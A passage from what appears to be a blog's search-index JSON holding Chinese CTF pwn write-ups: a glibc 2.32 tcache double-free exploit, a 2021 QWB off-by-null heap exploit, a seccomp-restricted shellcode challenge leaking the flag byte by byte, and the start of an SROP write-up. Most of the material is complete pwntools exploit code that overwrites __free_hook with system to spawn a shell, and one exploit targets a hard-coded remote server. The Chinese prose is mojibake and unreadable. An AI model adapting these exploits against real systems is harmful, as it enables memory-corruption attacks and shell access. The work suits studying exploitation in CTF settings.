new(size, content):\n    cmd(1)\n    p.recvuntil(b\"Size:\")\n    p.sendline(str(size).encode())\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef free():\n    cmd(2)\n\ndef show():\n    cmd(3)\n\ndef edit(content):\n    cmd(5)\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef exp():\n\n    #leak heap_base\n    new(0x80,'PIG007NB')\n    free()\n    show()\n    heap_leak = u64(rc(5).ljust(8,'\\x00'))\n    heap_base = heap_leak*0x1000\n    log.info(\"heap_base:0x%x\"%heap_base)\n\n    #change key to make double free\n    edit('PIG007NBPIG007NB')\n    free()\n\n    #change 0x290(7) to free tcache(0x290) into unsortedbin\n    edit(p64((heap_leak) ^ (heap_base + 0x10)))\n    new(0x80, 'PIG007NB')\n    new(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\n    free()\n    #--------------------------------------------\n    new(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, '\\x00'))\n    #--------------------------------------------\n    \n    \n    new(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\n    new(0x18,p16(0x66c0))\n    new(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n    #new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n    #this will be OK\n    main_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\n    test = main_arena>>40\n    log.info(\"main_arena:0x%x\"%main_arena)\n    log.info(\"test:0x%x\"%test)\n    if(test != 0x7f):\n        return\n    malloc_hook = main_arena-0x10\n    obj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n    libc_base = malloc_hook-obj.dump('__malloc_hook')\n    #stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n    # log.info(\"stdout_addr:0x%x\"%stdout_addr)\n    # obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n    # libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\n    system_addr = libc_base + obj.dump(\"system\")\n    __free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\n    log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x18,'PIG007NB')\n    new(0x18,'PIG007NB')\n\n\n    #one_gadget = libc_base + 0xdf54c\n    new(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\n    new(0x38, p64(system_addr))\n    new(0x38, p64(system_addr))\n\n    new(0x10, '/bin/sh\\x00')\n    pause()\n    free()\n    p.interactive()\n\ncount = 1\nwhile True:\n    try:\n        print('the no.' + str(count) + ' try')\n        p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n        #p = remote('node3.buuoj.cn', 26018)#process('./ff') #\n        exp()\n        \n    except Exception as e:\n    \tprint(e)\n        p.close()\n        count = count + 1\n        continue\n```\n\n \n\nâ–²æ€»ç»“ä¸€ä¸‹ï¼š\n\n(1)IO_FILEçš„æ–°çŸ¥è¯†ï¼š\n\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n\n(2)2.32Tcacheæœºåˆ¶ï¼š\n\nâ‘ æ”¾å…¥tcacheå¯¹åº”biné“¾è¡¨æ—¶ä¼šå¼‚æˆ–heap_base/0x1000ï¼Œå¹¶ä¸”fdä¹Ÿä¼šå˜åŒ–ã€‚\n\nâ‘¡biné“¾è¡¨ä¸­çš„countå’Œç”³è¯·ä¸å¦çš„å…³ç³»ï¼š\n\nå¦‚æœtcacheçš„å¯¹åº”binçš„countä¸º0ï¼Œåˆ™ä¸ä¼šä»è¯¥Tcacheä¸­ç”³è¯·ã€‚\n\nå¦‚æœå¤§äºç­‰äº1ï¼Œé‚£ä¹ˆå°±éœ€è¦çœ‹tcacheç»“æ„ä½“ä¸Šå¯¹åº”biné“¾è¡¨å­˜æ”¾çš„chunkåœ°å€æ˜¯å¦ä¸ºä¸€ä¸ªåˆæ³•çš„äº†ï¼Œå¦‚æœä¸åˆæ³•åˆ™ä¼šç”³è¯·å¤±è´¥ï¼Œç¨‹åºé€€å‡ºã€‚(åº”è¯¥éƒ½æ˜¯è¿™æ ·çš„)\n\nâ‘¢éœ€è¦ä¿®æ”¹Keyå­—æ®µæ‰èƒ½double freeï¼Œå³free çš„æ—¶å€™ä¼šæ£€æµ‹ key å­—æ®µæ˜¯å¦ä¸º tcacheï¼Œå¦‚æœç›¸ç­‰åˆ™æ£€æµ‹ free çš„æŒ‡é’ˆå€¼æ˜¯å¦åœ¨å¯¹åº”çš„tcacheçš„binä¸Šï¼Œå¦‚æœåœ¨åˆ™è§†ä¸ºç¨‹åºåœ¨ double freeï¼Œè¿›è€Œç»ˆæ­¢ç¨‹åºã€‚\n\n","tags":["Tcache"],"categories":["PWN","pwnå †-Tcache"]},{"title":"2021-QWB","url":"/2021/08/14/2021-QWB/","content":"\nä¸€ã€baby_diary\n\n2.31ä¸‹çš„off-by-nullï¼Œå¤šæº¢å‡ºåŠä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æ€»å…±éœ€è¦çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ã€‚è¿™é‡Œè¿˜éœ€è¦ç»•è¿‡readçš„æ£€æŸ¥ï¼Œä¸è¿‡æˆ‘è¿™ä¸ªå¸ƒå±€å®Œä¹‹ååˆšå¥½å¯ä»¥é€šè¿‡ï¼Œä¹Ÿå°±æ²¡å¤ªç®¡äº†ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./baby_diary\"\nlibc_file = \"./libc-2.31.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\nmenu = \">> \"\n\n\ndef add(size, con):\n\tsla(menu, \"1\")\n\tsla(\"size: \", str(size))\n\tsla(\"content: \", con)\n\ndef delete(idx):\n\tsla(menu, \"3\")\n\tsla(\"index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"2\")\n\tsla(\"index: \", str(idx))\n\n\ndef pwn():\n\n\n    #(1)å‰æœŸå‡†å¤‡åŠ å †å¸ƒå±€:\n    for i in range(7): # 0-6\n        add(0x2000-1, \"/bin/sh\\x00\")\n    add(0x2000-0x1410-0x40-1, \"padding\") # 7\n\n    for i in range(7): # 8-14\n        add(0x28-1, 'tcache')\n\n    #crux chunk15\n    add(0xb20-1, \"largebin\") # 15\n    #prevent merge\n    add(0x10-1, \"padding\") # 16\n\n\n\n\n    #(2)åˆ¶ä½œfake_chunkï¼Œåˆ©ç”¨largebinè¸©ä¸‹fd_nextsizeå’Œbk_nextsize:\n    delete(15)\n\n    #chunk15 to largebin\n    add(0x1000-1, '\\n') #15\n    #make fake_chunk in chunk17\n    add(0x28-1, p64(0x6) + p64(0x601) + p8(0x40)) #17\n\n\n\n    #(3)è”åŠ¨fastbinå’Œsmallbinï¼š\n    add(0x28-1, '\\x18') # 18\n    add(0x28-1, '\\xaa') # 19\n    add(0x28-1, '\\x20') # 20\n    add(0x28-1, '\\x21') # 21\n    # fill in tcache(0x30)\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    delete(20)\n    delete(18)\n\n    # clear tcache(0x30)\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # fastbin to smallbin\n    add(0x400-1, '\\x20') #18\n\n    # get chunk18 from smallbin ,chunk20 to tcache\n    # change chunk18->bk to point to fake_chunk\n    add(0x28-1, p64(0) + p8(0x20)) #20\n\n\n\n    #(4)åˆ©ç”¨fastbinä¿®æ”¹chunk17->fdï¼š\n    # clear chunk from tcache\n    add(0x28-1, 'clear') # 21 from tcache \n\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    # free to fastbin\n    delete(19)\n    delete(17)\n\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # change chunk17->fd to point to fake_chunk\n    add(0x28-1, p8(0x20)) #17\n\n\n    #(5)è§¦å‘off-by-null:\n    add(0x28-1, \"\\x19\")# 19 from fastbin\n    show(19)\n\n    add(0x108-1, \"\\x23\") # 23 cutting from chunk15 in unsortebin,for overwrite\n    add(0x518-1, \"\\x24\") # 24 legacy from chunk15 in unsortebin,for trigger off-by-null\n    #add(0x100-1, \"padding\") # 24\n    # off-by-null \n\n    delete(23)\n    add(0x108-1,p64(0x0)*0x21)\n    delete(23)\n    add(0x108-1,p64(0x0)*0x1f+\"\\x00\"*7+\"\\x06\")\n    #edit(22, \"a\"*0x20 + p64(0x520))\n    # trigger\n    delete(24)\n    add(0x4e8-1,\"padding\")\n    show(23)\n    ru(\"content: \")\n    main_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n    malloc_hook = main_arena-0x10\n    libc_base = malloc_hook - libc.sym['__malloc_hook']\n    free_hook = libc_base + libc.sym['__free_hook']\n    system_addr = libc_base + libc.sym['system']\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"libc_base:0x%x\"%libc_base)\n\n    delete(24)\n    delete(1)\n    delete(2)\n    delete(3)\n    delete(8)\n    delete(19)\n    add(0x4e8-1,p64(0x30)*8+p64(0x30)+p64(0x31)+p64(free_hook))\n    add(0x28-1,\"padding\")\n    add(0x28-1,p64(system_addr))\n    delete(0)\n    p.interactive()\n    #add(0x18-1,\"A\")\n    #add(0x18-1,\"B\")\n    #delete(0)\n    #add(0x18-1,p64(0x0)*2+(\"\\x30\"+\"\\x20\").ljust(8,\"\\x00\"))\n    #pause()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    #p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    p = remote(\"8.140.114.72\",1399)\n    try:\n        pwn()\n        p.recv(timeout = 0.5) \n        #è¦ä¹ˆå´©æºƒè¦ä¹ˆçˆ†ç ´æˆåŠŸï¼Œè‹¥å´©æºƒioä¼šå…³é—­ï¼Œio.recv()ä¼šè§¦å‘   EOFError\n        EOFError\n    except EOFError:\n        p.close()\n        continue\n    else:\n        sleep(0.1)\n        p.sendline(\"1\")\n        pause()\n        break\n```\n\n \n\näºŒã€shellcodeï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_16-43-10.png)\n\nåªæœ‰ç³»ç»Ÿå·0x9,0x5,0x25,0x0,0xe7æ‰èƒ½æ­£å¸¸è¢«æ‰§è¡Œï¼Œè€Œ0x5åœ¨32ä½ä¸‹æ˜¯openï¼Œå³å¯ä»¥åˆ©ç”¨åˆ°openï¼Œmmapï¼Œå’Œreadå‡½æ•°ã€‚å¯¹äºORWå°‘äº†ä¸€ä¸ªWï¼Œå¯ä»¥ä½¿ç”¨flagçš„é€ä¸ªå­—ç¬¦æ¯”è¾ƒçš„æ–¹æ³•æ¥çˆ†ç ´å‡ºflagã€‚ç”±äºåˆ‡æ¢retfqéœ€è¦æ¶‰åŠåˆ°æ„é€ 32ä½çš„æ ˆåœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œæœ€å¥½è¿˜æ˜¯ç”¨mmapæ¥ç”³è¯·æŒ‡å®šä½ç½®çš„ä¸€ç‰‡ç©ºé—´ï¼Œä»è€ŒåŠ«æŒæ ˆã€‚\n\n(1)mmapçš„è®¾ç½®ï¼š\n\n```python\nshellcode_mmap = '''\n/*mmap(0x40404040,0x7e,,0x7,0x22,0,0)*/\nxor rax,rax\n\n/*set rdx*/\nmov al,0x7\npush rax\npop rdx\n\n/*set rcx*/\nmov al,0x22\npush rax\npop rcx\n\n/*set rdi*/\nxor rdi,rdi\nmov edi,0x40404040\n\n/*set rsi*/\nmov al,0x7e\npush rax\npop rsi\n\n/*set rax*/\nmov al,0x9\n\n/*set r8,r9*/\nxor r8,r8\nxor r9,r9\n\nsyscall\n'''\n```\n\nè¿™é‡Œç”±äºå¯¹è¾“å…¥å­—ç¬¦åšäº†é™åˆ¶ï¼Œåªèƒ½æ˜¯å¯è§å­—ç¬¦ï¼ŒåŒæ—¶ç”±äºè¿™é‡Œä½¿ç”¨alpha3è¿™ä¸ªå·¥å…·æ¥å°†shellcodeç¼–ç æˆå¯è§å­—ç¬¦ã€‚ä½†æ˜¯è¿™ä¸ªå·¥å…·æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä¸èƒ½å‡ºç°\\x00è¿™ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨mov rax,0x9åˆ™ä½¿å¾—0x9åœ¨64ä½æ˜¯0x0000000000000009ï¼Œå­˜åœ¨\\x00å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°al,dl,ç­‰8ä½å¯„å­˜å™¨ï¼Œæ¥è½¬æ¢ä¸€ä¸‹ã€‚\n\n(2)readçš„è®¾ç½®ï¼š\n\n```python\nshellcode_read = '''\n/*read(0,0x40404040,0x70)*/\nxor rax,rax\nxor rdi,rdi\nxor rsi,rsi\nmov esi,0x40404040\nxor rdx,rdx\nmov dl,0x70\nsyscall\n'''\n```\n\nè¯»å…¥åˆ°ä¹‹å‰ç”¨mmapå¼€è¾Ÿçš„ç©ºé—´0x40404040å¤„ã€‚\n\n(3)retfqçš„è®¾ç½®ï¼š\n\n```python\nshellcode_retfq = '''\nmov esp,0x40404440\npush 0x23\npush 0x40404040\nretfq\n'''\n```\n\nâ‘ éœ€è¦32ä½çš„æ ˆï¼ŒåŒæ—¶åŠ«æŒespï¼Œä½¿å¾—æ ˆä¸Šçš„å®Œå…¨å¯æ§ï¼Œé˜²æ­¢pushå‡ºé”™ã€‚\n\nâ‘¡è¿™é‡Œ0x23ä¸ºè½¬32ä½ï¼Œ0x33ä¸ºè½¬64ä½ã€‚\n\nâ‘¢push 0x40404040æ˜¯åœ¨retfqä¹‹åè·³è½¬çš„åœ°æ–¹ï¼Œéœ€è¦æ”¾åˆ°æ ˆä¸Šã€‚\n\nâ–²æ±‡ç¼–ç‚¹ï¼šå­˜åœ¨xor,mov,retfqå¤šçš„æ—¶å€™ï¼Œéœ€è¦æ˜¯ï¼šshellcode_x64 = asm(shellcode_x64,arch = 'amd64',os='linux')æ‰è¡Œã€‚\n\nä»¥ä¸Šçš„å¾ˆå¤šä¸å¤ªçŸ¥é“åŸç†ï¼Œå…·ä½“çš„åœ¨å…·ä½“ç”¨åˆ°æ—¶å€™å†æ”¹ã€‚\n\n(4)orwä¸­çš„orè®¾ç½®ï¼š\n\n```python\nshellcode_open = '''\nmov eax, 5\npush 0x67616c66\nmov ebx, esp\nxor ecx, ecx\nint 0x80\nmov ecx, eax\n'''\n\nshellcode_to64 = '''\npush 0x33\npush 0x4040402b\nretfq\n'''\n\nshellcode_read_flag = '''\nmov rdi,rcx\nmov rsi,rsp\nmov rdx,0x70\nxor rax,rax\nsyscall\n'''\n```\n\n(5)çˆ†ç ´çš„æ±‡ç¼–ä»£ç è®¾ç½®ï¼š\n\n```python\nif flag_pos == 0:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-4; ret\".format(flag_pos, ch)\nelse:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-5; ret\".format(flag_pos, ch)\n```\n\nè¿™é‡Œçš„chå³ä¸ºå¾ªç¯çš„å¯è§å­—ç¬¦ï¼Œflag_posæ˜¯è¯»å‡ºflagçš„å¯¹åº”ä½ç½®ï¼Œä½†æ˜¯åŸç†å°±æ˜¯å°†è¯»å–çš„flagéå†æ¯”è¾ƒæ‰€æœ‰å¯è§å­—ç¬¦ï¼Œç›¸ç­‰åˆ™ä½¿å¾—ç¨‹åºè·³å…¥å¾ªç¯ä¸­ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡è®¾ç½®timeoutä¸ºæŸä¸ªå€¼æ¥åˆ¤æ–­è¿™ä¸ªå­—ç¬¦æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰åˆ™åŠ å…¥åˆ°flagä¸­ã€‚ç±»ä¼¼çš„æœ‰ï¼š\n\n```python\ncheck = '''\nmov dl, byte ptr [rsi+{}]\nmov cl, {}\ncmp cl,dl\njz loop\nmov al,231\nsyscall\nloop:\njmp loop\n'''.format(reloc,ch)\n```\n\nè¿™é‡Œå°±ç”¨åˆ°äº†exit_groupï¼Œå¦å¤–rsp,rsi,ç”šè‡³rbxéƒ½å¯ä»¥çš„ï¼Œå› ä¸ºè¯»å–ä¹‹åè¿™ä¸‰ä¸ªå¯„å­˜å™¨éƒ½ä¿å­˜äº†flagçš„å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_22-28-12.png)\n\n(6)æ±‡æ€»ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nfrom pwn import * \n\nshellcode_open = '''\n    mov eax, 5\n    push 0x67616c66\n    mov ebx, esp\n    xor ecx, ecx\n    int 0x80\n    mov ecx, eax\n    '''\n\nshellcode_to64 = ''' \n    push 0x33\n    push 0x4040405b\n    retfq\n'''\n\nshellcode_read_flag = '''\n    mov rdi,rcx\n    mov rsi,rsp\n    mov rdx,0x70\n    xor rax,rax\n    syscall\n'''\n\nshellcode_open = asm(shellcode_open)\nshellcode_to64 = asm(shellcode_to64,arch = 'amd64',os = 'linux')\nshellcode_read_flag = asm(shellcode_read_flag,arch = 'amd64',os = 'linux')\n\n\ndef pwn(p, flag_pos, ch):\n        payload = \"Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e4A070c7o4D0c1P0n0x0R3X8P0t140p2C4A2N1P005p0q1M0c3c2u194Y7o0q0y154008135L1L0p3T400q2p0p0p1M0A3r3S0A0B053O0s2G0r051k2z1l2y0w2O0p093k0y\"\n        p.sendline(payload)\n        sc = asm('''\n        mov dl, byte ptr [rsi+{}]\n        mov cl, {}\n        cmp cl,dl\n        jz loop\n        mov al,231\n        syscall\n        loop:\n        jmp loop\n        '''.format(flag_pos,ch),arch = 'amd64',os = 'linux')\n\n        if flag_pos == 0:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-4; ret\".format(flag_pos, ch)\n        else:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-5; ret\".format(flag_pos, ch)\n        check = asm(shellcode, arch='amd64', os='linux')\n\n        payload = shellcode_open + shellcode_to64 + shellcode_read_flag + check \n        #pause()\n        p.send(payload)\n        #pause()\n\nmy_flag = \"\"\nflag_pos = 0\nwhile True:\n    for ch in range(33, 127):\n        #p = remote(\"39.105.137.118\", 50050)\n        p = process(\"./shellcode\")\n        try:\n            print(ch)\n            pwn(p, flag_pos, ch)\n            p.recvline(timeout=3.0)\n            my_flag = my_flag + chr(ch)\n            print(\"=>\", my_flag)\n            flag_pos += 1\n            p.close()\n            break\n        except EOFError:\n            ch += 1\n            p.close()\n    if(my_flag[-1] == '}'):\n        break\nlog.info(\"flag:%s\"%my_flag)\n```\n\n \n\n \n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"360ichunqiu 2017-smallest","url":"/2021/08/14/360ichunqiu 2017-smallest/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†ä¸€ä¸ªNXï¼Œæ²¡åŠæ³•shellcodeã€‚IDAæ‰“å¼€æŸ¥çœ‹ç¨‹åºï¼Œæ‰¾æ¼æ´ï¼Œæœ‰ä¸ªå±çš„æ¼æ´ï¼Œåªæœ‰ä¸€ä¸ªsyscallçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå„ç§æ ˆæ“ä½œä¹Ÿæ²¡æœ‰ã€‚\n\n2.è§‚å¯Ÿè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨å‚æ•°é€šè¿‡edx,rsi,rdièµ‹å€¼ï¼Œedxç›´æ¥è¢«èµ‹å€¼ä¸º400hï¼Œbufå¯¹åº”çš„rsiè¢«rspèµ‹å€¼ï¼Œç³»ç»Ÿè°ƒç”¨å·fdå¯¹åº”çš„rdiè¢«raxèµ‹å€¼ã€‚å†æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œæœ‰xor rax,raxï¼Œæ‰€ä»¥raxä¸€å®šæ˜¯0ï¼Œé‚£ä¹ˆè¿™ä¸ªsyscallç³»ç»Ÿè°ƒç”¨çš„å°±æ˜¯readå‡½æ•°ï¼Œè¯»å–çš„æ•°å–ç›´æ¥å­˜å…¥æ ˆé¡¶ã€‚ç”±äºbufå¤§å°ä¸º400hï¼Œä¸”åªæœ‰ä¸€ä¸ªsyscallï¼Œä¹‹åç›´æ¥retnï¼Œæ²¡æœ‰leaveæŒ‡ä»¤ï¼Œè¿™å°±ä»£è¡¨äº†rspæŒ‡å‘çš„åœ°å€å°±æ˜¯æˆ‘ä»¬æ‰§è¡Œå®Œsyscallåstartå‡½æ•°retnçš„è¿”å›åœ°å€(pop eip)ã€‚ä¹Ÿå°±æ˜¯å¦‚æœè¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œè¯»å–å®Œä¹‹åï¼Œé€šè¿‡retnå°±ä¼šè·³è½¬åˆ°è¯¥åœ°å€ä¸­ã€‚å¦å¤–ç¨‹åºä¸­é™¤äº†retnä¹‹å¤–æ²¡æœ‰å…¶å®ƒå¯¹æ ˆå¸§è¿›è¡Œæ“ä½œçš„æŒ‡ä»¤ï¼Œå¦‚æœè¾“å…¥å¤šä¸ªsyscallåœ°å€ï¼Œå°±å¯ä»¥åå¤æ‰§è¡Œsyscallã€‚å¹¶ä¸”æœ€å¼€å§‹è¾“å…¥400hå­—èŠ‚ï¼Œç¨‹åºæµå®Œå…¨å¯æ§ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg)\n\n3.é¦–å…ˆæƒ³åˆ°ropï¼Œä½†æ˜¯é¢˜ç›®æ²¡ç»™Libcï¼Œå¹¶ä¸”é€šè¿‡è°ƒè¯•å‘ç°ï¼Œè¿™ä¸ªç¨‹åºå‹æ ¹å°±æ²¡å¯¼å…¥å¤–éƒ¨çš„Libcåº“ï¼ŒIDAä¸­æ‰“å¼€æ²¡æœ‰externï¼Œå®Œå…¨æ²¡åŠæ³•å¸¸è§„ropï¼Œé‚£ä¹ˆæƒ³ç”¨SROPã€‚è¿œç¨‹è°ƒè¯•ä¸€ä¸‹æŸ¥çœ‹å †æ ˆæ•°æ®ï¼Œå‘ç°ä¸´æ—¶åˆ›å»ºçš„smallestæ®µæ•°æ®æ²¡æœ‰å¯å†™æƒé™ï¼Œèƒ½å¤Ÿåˆ©ç”¨çš„åªæœ‰[stack]æ ˆæ•°æ®ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦å…ˆæ³„éœ²ä¸€ä¸ªæ ˆåœ°å€æ¥è®©æˆ‘ä»¬èƒ½å¤Ÿå¾€æ ˆä¸­å†™å…¥æ•°æ®binshä»è€Œè°ƒç”¨execve(â€˜/bin/sh\\x00â€™ï¼Œ0ï¼Œ0)æ¥ç›´æ¥getshellã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg)\n\n4.ä¹‹åè§‚å¯Ÿæ ˆä¸Šçš„æ•°æ®ï¼Œå‘ç°å½“è¿è¡Œåˆ°syscallæ—¶ï¼Œrspä¸‹æ–¹çš„å†…å®¹å…¨æ˜¯æ ˆä¸Šçš„åœ°å€ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg)\n\nrbpä¸€ç›´éƒ½æ˜¯0x000......è¿™æ˜¯å› ä¸ºç¨‹åºåªæœ‰ä¸€ä¸ªstartå‡½æ•°ï¼Œæ ¹æœ¬å°±æ²¡æœ‰ä¸ºå‡½æ•°å†æ¬¡åˆ›å»ºæ ˆï¼Œæ‰€ç”¨çš„åªæ˜¯æœ€åˆç”Ÿæˆçš„æ ˆç©ºé—´ã€‚æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨sys_writeå‡½æ•°ï¼Œæ¥æ‰“å°rspæŒ‡å‘çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯æŸä¸ªæ ˆåœ°å€ï¼Œè¿™æ ·å°±æˆåŠŸæ³„éœ²æ ˆåœ°å€ã€‚\n\n5.ä½†æ˜¯sys_writeçš„è°ƒç”¨å·æ˜¯1ï¼Œè€Œé€šè¿‡è°ƒè¯•å‘ç°raxçš„åˆå§‹å€¼è¢«é»˜è®¤è®¾ç½®ä¸º0ï¼Œå¹¶ä¸”ç¨‹åºä¸­æ²¡æœ‰ä»»ä½•ä¿®æ”¹raxçš„ä»£ç ã€‚å”¯ä¸€ä¸€ä¸ªä¹Ÿåªæœ‰xor   rax, raxï¼Œä½†æ˜¯ä»»ä½•æ•°å’Œæœ¬èº«å¼‚æˆ–çš„ç»“æœéƒ½æ˜¯0ï¼Œæ‰€ä»¥å¦‚æœç¨‹åºæ¯æ¬¡éƒ½ä»è¿™è¡Œä»£ç æ‰§è¡Œï¼Œé‚£ä¹ˆæ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨å·æ°¸è¿œéƒ½æ˜¯0ï¼Œä¹Ÿå°±æ˜¯ä¼šæ— é™å¾ªç¯readã€‚è¿™é‡Œæƒ³åˆ°ç”±äºæ ˆå®Œå…¨å¯æ§ï¼Œå¹¶ä¸”è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œç¨‹åºæ‰§è¡Œå®Œè¿™ä¸ªåœ°å€å¯¹åº”çš„å‡½æ•°åretnä¼šç›´æ¥è·³è½¬åˆ°rspçš„ä¸‹ä¸€è¡Œã€‚è¿™é‡Œé€‰æ‹©è®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡sys_readå‡½æ•°ï¼Œä¹‹åæˆ‘ä»¬ä¸ºå…¶ä¸­ä¸€æ¬¡è¾“å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”è¿™æ¬¡è¿”å›ä¸å†ä»xorè¿™è¡Œä»£ç å¼€å§‹æ‰§è¡Œï¼Œä»mov rsi, rspå¼€å§‹ã€‚ç”±äºsys_readçš„è¿”å›å€¼è‡ªåŠ¨å†™å›ç»™rax(ä¸€èˆ¬å‡½æ•°çš„è¿”å›å€¼éƒ½ä¼šå†™ç»™rax)ï¼Œæ‰€ä»¥è¯»å–å‡ ä¸ªå­—èŠ‚readå°±å‘raxå†™å…¥å¤šå°‘ï¼Œè¿™æ ·å°±ä¼šä½¿å¾—raxä¹Ÿå¯ä»¥å¾—åˆ°æ§åˆ¶ï¼Œä¸å†è¢«xorä¸º0ï¼Œè°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ã€‚\n\n6.æ‰€ä»¥ç¼–å†™payload:å…ˆå°è¯•ä¸€ä¸‹çœ‹èƒ½å¦æ³„éœ²æ ˆåœ°å€ï¼Œtest1.py\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += p64(start_addr)\npayload += p64(set_rsi_rdi_addr)\npayload += p64(start_addr)\n#æ³„éœ²æ 